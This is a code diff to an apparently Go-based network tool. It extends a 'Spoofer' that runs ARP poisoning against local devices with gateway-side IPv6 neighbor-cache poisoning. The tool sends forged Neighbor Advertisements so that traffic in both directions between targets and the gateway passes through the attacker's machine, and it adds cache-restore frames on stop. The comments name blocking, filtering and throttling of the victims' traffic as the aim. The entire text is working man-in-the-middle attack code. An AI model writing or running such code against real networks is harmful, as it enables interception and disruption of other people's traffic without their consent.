@@ -26,6 +26,7 @@ const defaultSpoofInterval = time.Second
 // Spoofer maintains ARP poisoning for a set of targets and restores their caches on stop.
 type Spoofer struct {
 	handle Handle
+	table  *Table // to look up a device's learned IPv6 addresses for gateway-side NDP poisoning
 
 	mu       sync.Mutex
 	cfg      SpoofConfig
@@ -40,8 +41,16 @@ func (s *Spoofer) send(frame []byte) {
 	}
 }
 
-func NewSpoofer(h Handle) *Spoofer {
-	return &Spoofer{handle: h}
+func NewSpoofer(h Handle, table *Table) *Spoofer {
+	return &Spoofer{handle: h, table: table}
+}
+
+// v6Targets returns the device's learned global IPv6 addresses, or nil if none/no table.
+func (s *Spoofer) v6Targets(mac net.HardwareAddr) []net.IP {
+	if s.table == nil {
+		return nil
+	}
+	return s.table.V6Addrs(mac)
 }
 
 // Update swaps the running session's configuration. The poison loop reads the config each tick,
@@ -68,6 +77,11 @@ func (s *Spoofer) RestoreDevice(t Device) {
 		if cfg.GatewayIP6 != nil {
 			if frame, err := BuildNeighborAdvertisement(cfg.SelfMAC, t.MAC, cfg.GatewayIP6, cfg.GatewayIP6, cfg.GatewayMAC); err == nil {
 				s.send(frame)
+			}
+			for _, v6 := range s.v6Targets(t.MAC) {
+				if frame, err := BuildNeighborAdvertisement(cfg.SelfMAC, cfg.GatewayMAC, v6, v6, t.MAC); err == nil {
+					s.send(frame)
+				}
 			}
 		}
 		time.Sleep(50 * time.Millisecond)
@@ -121,11 +135,18 @@ func (s *Spoofer) poisonOnce() {
 				s.send(frame)
 			}
 		}
-		// IPv6: tell the target the gateway's link-local is at our MAC so its IPv6 traffic also
-		// flows through us. Half-duplex (device side) is enough for blocking and filtering.
+		// IPv6 device side: tell the target the gateway's link-local is at our MAC so its IPv6
+		// uploads flow through us (enables blocking and filtering of IPv6 traffic).
 		if cfg.GatewayIP6 != nil {
 			if frame, err := BuildNeighborAdvertisement(cfg.SelfMAC, t.MAC, cfg.GatewayIP6, cfg.GatewayIP6, cfg.SelfMAC); err == nil {
 				s.send(frame)
+			}
+			// IPv6 gateway side: tell the gateway each of the device's IPv6 addresses is at our
+			// MAC so the download direction also flows through us (enables IPv6 throttling).
+			for _, v6 := range s.v6Targets(t.MAC) {
+				if frame, err := BuildNeighborAdvertisement(cfg.SelfMAC, cfg.GatewayMAC, v6, v6, cfg.SelfMAC); err == nil {
+					s.send(frame)
+				}
 			}
 		}
 	}
@@ -153,6 +174,11 @@ func (s *Spoofer) Restore() error {
 			if cfg.GatewayIP6 != nil {
 				if frame, err := BuildNeighborAdvertisement(cfg.SelfMAC, t.MAC, cfg.GatewayIP6, cfg.GatewayIP6, cfg.GatewayMAC); err == nil {
 					s.send(frame)
+				}
+				for _, v6 := range s.v6Targets(t.MAC) {
+					if frame, err := BuildNeighborAdvertisement(cfg.SelfMAC, cfg.GatewayMAC, v6, v6, t.MAC); err == nil {
+						s.send(frame)
+					}
 				}
 			}
 		}
